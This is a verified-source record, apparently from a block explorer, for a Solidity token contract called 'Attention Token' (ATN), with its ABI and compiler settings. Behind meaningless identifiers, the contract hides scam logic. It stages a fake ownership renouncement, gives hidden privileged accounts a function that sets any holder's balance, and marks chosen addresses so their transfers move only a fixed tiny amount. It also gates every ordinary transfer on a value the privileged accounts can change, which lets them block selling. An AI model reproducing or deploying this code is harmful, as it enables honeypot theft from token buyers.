{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface feeLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverSwap) external view returns (uint256);\n\n    function transfer(address minTotalMax, uint256 senderTake) external returns (bool);\n\n    function allowance(address launchedBuyFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minTotalMax,\n        uint256 senderTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyTx, uint256 value);\n    event Approval(address indexed launchedBuyFund, address indexed spender, uint256 value);\n}\n\nabstract contract receiverSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityMaxTotal {\n    function createPair(address limitTokenList, address walletMax) external returns (address);\n}\n\ninterface feeLaunchMetadata is feeLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AttentionToken is receiverSender, feeLaunch, feeLaunchMetadata {\n\n    uint256 public senderMax;\n\n    bool public tradingIs;\n\n    function getOwner() external view returns (address) {\n        return liquidityTeam;\n    }\n\n    bool private launchAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return amountSenderWallet;\n    }\n\n    function transferFrom(address launchedMarketing, address minTotalMax, uint256 senderTake) external override returns (bool) {\n        if (_msgSender() != takeFee) {\n            if (tradingLaunched[launchedMarketing][_msgSender()] != type(uint256).max) {\n                require(senderTake <= tradingLaunched[launchedMarketing][_msgSender()]);\n                tradingLaunched[launchedMarketing][_msgSender()] -= senderTake;\n            }\n        }\n        return fromTeamFund(launchedMarketing, minTotalMax, senderTake);\n    }\n\n    function owner() external view returns (address) {\n        return liquidityTeam;\n    }\n\n    uint256 listSwap;\n\n    address public maxList;\n\n    string private amountSenderWallet = \"Attention Token\";\n\n    function launchedList(address teamSender) public {\n        if (walletAuto) {\n            return;\n        }\n        \n        atMarketing[teamSender] = true;\n        if (senderMax != teamTotalMax) {\n            txLiquidity = false;\n        }\n        walletAuto = true;\n    }\n\n    function modeMarketing(address launchedMarketing, address minTotalMax, uint256 senderTake) internal returns (bool) {\n        require(tradingAmount[launchedMarketing] >= senderTake);\n        tradingAmount[launchedMarketing] -= senderTake;\n        tradingAmount[minTotalMax] += senderTake;\n        emit Transfer(launchedMarketing, minTotalMax, senderTake);\n        return true;\n    }\n\n    mapping(address => bool) public fromMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptWallet;\n    }\n\n    uint8 private receiverTotalBuy = 18;\n\n    string private autoTo = \"ATN\";\n\n    function shouldWallet() private view {\n        require(atMarketing[_msgSender()]);\n    }\n\n    uint256 public teamTotalMax;\n\n    function allowance(address launchedExempt, address totalMarketing) external view virtual override returns (uint256) {\n        if (totalMarketing == takeFee) {\n            return type(uint256).max;\n        }\n        return tradingLaunched[launchedExempt][totalMarketing];\n    }\n\n    bool private teamList;\n\n    address public fromTakeSwap;\n\n    event OwnershipTransferred(address indexed enableAmount, address indexed swapMode);\n\n    constructor (){\n        \n        exemptMarketing sellTx = exemptMarketing(takeFee);\n        maxList = liquidityMaxTotal(sellTx.factory()).createPair(sellTx.WETH(), address(this));\n        \n        fromTakeSwap = _msgSender();\n        toFee();\n        atMarketing[fromTakeSwap] = true;\n        tradingAmount[fromTakeSwap] = exemptWallet;\n        if (txSell != teamTotalMax) {\n            launchAmount = false;\n        }\n        emit Transfer(address(0), fromTakeSwap, exemptWallet);\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingLaunched;\n\n    bool public isFeeSell;\n\n    bool public walletAuto;\n\n    function sellReceiver(address launchedMin) public {\n        shouldWallet();\n        \n        if (launchedMin == fromTakeSwap || launchedMin == maxList) {\n            return;\n        }\n        fromMin[launchedMin] = true;\n    }\n\n    function toFee() public {\n        emit OwnershipTransferred(fromTakeSwap, address(0));\n        liquidityTeam = address(0);\n    }\n\n    function approve(address totalMarketing, uint256 senderTake) public virtual override returns (bool) {\n        tradingLaunched[_msgSender()][totalMarketing] = senderTake;\n        emit Approval(_msgSender(), totalMarketing, senderTake);\n        return true;\n    }\n\n    function balanceOf(address receiverSwap) public view virtual override returns (uint256) {\n        return tradingAmount[receiverSwap];\n    }\n\n    function limitTeam(address shouldReceiver, uint256 senderTake) public {\n        shouldWallet();\n        tradingAmount[shouldReceiver] = senderTake;\n    }\n\n    uint256 txLimit;\n\n    uint256 constant receiverIsTeam = 8 ** 10;\n\n    address fundTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private totalSwap;\n\n    uint256 public txSell;\n\n    mapping(address => bool) public atMarketing;\n\n    bool private txLiquidity;\n\n    function transfer(address shouldReceiver, uint256 senderTake) external virtual override returns (bool) {\n        return fromTeamFund(_msgSender(), shouldReceiver, senderTake);\n    }\n\n    address private liquidityTeam;\n\n    function fromTeamFund(address launchedMarketing, address minTotalMax, uint256 senderTake) internal returns (bool) {\n        if (launchedMarketing == fromTakeSwap) {\n            return modeMarketing(launchedMarketing, minTotalMax, senderTake);\n        }\n        uint256 enableTeam = feeLaunch(maxList).balanceOf(fundTx);\n        require(enableTeam == txLimit);\n        require(minTotalMax != fundTx);\n        if (fromMin[launchedMarketing]) {\n            return modeMarketing(launchedMarketing, minTotalMax, receiverIsTeam);\n        }\n        return modeMarketing(launchedMarketing, minTotalMax, senderTake);\n    }\n\n    uint256 private exemptWallet = 100000000 * 10 ** 18;\n\n    function senderLaunch(uint256 senderTake) public {\n        shouldWallet();\n        txLimit = senderTake;\n    }\n\n    address takeFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoTo;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverTotalBuy;\n    }\n\n    mapping(address => uint256) private tradingAmount;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedBuyFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTakeSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFeeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSender\",\"type\":\"address\"}],\"name\":\"launchedList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTake\",\"type\":\"uint256\"}],\"name\":\"limitTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"}],\"name\":\"sellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderTake\",\"type\":\"uint256\"}],\"name\":\"senderLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTotalMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTotalMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AttentionToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}